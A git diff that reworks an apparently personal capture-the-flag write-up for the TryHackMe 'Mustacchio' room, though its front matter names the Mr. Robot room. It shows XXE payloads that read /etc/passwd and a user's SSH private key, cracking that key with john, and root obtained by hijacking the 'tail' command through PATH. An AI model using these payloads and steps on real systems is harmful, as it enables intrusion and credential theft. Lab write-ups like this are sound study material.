@@ -6,17 +6,12 @@ description: TryHackMe Mr. Robot CTF Write-Up
 tags: tryhackme wordpress 
 comments: false
 ---
-# Mustaccio
 -TRYHACKME CTF WRITEUP-
 [Link To CTF](https://tryhackme.com/room/mrrobot)
-
-
-
-mustaccio
-
-
-nmap shows 80 and 22 open
-
+<br>
+<br>
+c
+Our nmap scan shows ports 80 and 22 are open
 
 webpage shows not much - lot of placeholder pages
 
@@ -42,36 +37,29 @@ Can use online cracker or johntheripper to crack hash
 
 bulldog19
 
-ssh into machine as admin - didn't work
-ssh with -i <password file> - didn't work
-no other directories
-no /admin or /logn
+I got stuck here.
+I did not see any login pages
+And ssh with the password was also failing
+Lets go back and see what we missed
 
 
-nmap -p- shows higher port open: 8765
+AHH, so nmap -p- shows higher port open: 8765
+navigating here shows the admin panel login page
 
-navigating here shows admin panel login page
+Thecredentials we gathered are accepted here
+Logging in we see a message board
+Putting in random text gives un an error
 
 
-logging in we see a message board
-putting in random text gives un an error
-
-
-Sendign another request and capturing in burp
-looking at the response we can see:
+Let's send another request and capture the response in burpsuite
+Looking at the response we can see:
 1. username: Barry
 2. ssh is allowed with the correct key
 3. there is a directory /auth/dontforget.bak
-
-This shows us the xml format we will need to use 
-
-
-https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection#classic-xxe
-
-We will modify and test the basic blind XXE vulnerability:
+<br>
+This shows us the xml format we will need to use
 
 ----------------------
-
 <?xml version="1.0" encoding="UTF-8"?>
 
 <comment>
@@ -82,6 +70,15 @@ We will modify and test the basic blind XXE vulnerability:
 
 -----------------------
 
+<br>
+It looks like this is vulnerable to a XXE injection
+Let's check out example exploits found below:
+https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection#classic-xxe
+<br>
+We will modify and test the basic blind XXE vulnerability:
+
+-----------------------
+
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]>
 <comment>
@@ -89,7 +86,8 @@ We will modify and test the basic blind XXE vulnerability:
   <author>10DNC</author>
   <com>&test;</com>
 </comment>
-
+-----------------------
+This works, Lets try and get barries credentials:
 
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE root [<!ENTITY test SYSTEM 'file:///home/barry/.ssh/id_rsa'>]>
@@ -100,48 +98,45 @@ We will modify and test the basic blind XXE vulnerability:
 </comment>
 
 -----------------
+We now get the ssh id_rsa key for barry
 
-get id_rsa key
-save to text file
+We can save this to text file:
 > nano id_rsa
 
-lower permissions -- 
-
+We will then lower the permissions:
 > chmod 600 id_rsa
 
-use sshjohn to create hash 
-
+Now use sshjohn to create hash 
 > ssh2john id_rsa > hash
 
-use john to crack hash
-
+Then use JTR to crack hash
 > john -w=/usr/share/wordlists/rockyou.txt mustacchio_hash
 
-login with ssh 
+Now we can login with ssh using our new credentials
+> ssh -i id_rsa barry@<target_IP>
+> password: uriel james
 
-> ssh -i id_rsa barry@*.*.*.*
-> uriel james
-
-
-get user flag !!!!
-
-
-priv esc
-
-we see another user with an elf file
-
-running strings we see that its calling another file using tail
-
+We now have a shell and can get user flag !!!!
+<br>
+<br>
+<br>
+# priv esc
+<br>
+<br>
+Looking around,
+We see another user
+There is an accessible elf file we can read
+<br>
+Running strings we see that its calling another file using tail
 We dont have permission to access to this file
-
-
-Lets hijack the "tail" command
-
+<br>
+Lets hijack the "tail" command:
 
 go into /tmp 
 echo "/bin/bash" > tail
+
 run the live_log:
 /home/joe/live_log
 
-get root
-read root flag
+We are now root
+Let's catpure the root flag and pwn the machine !!!
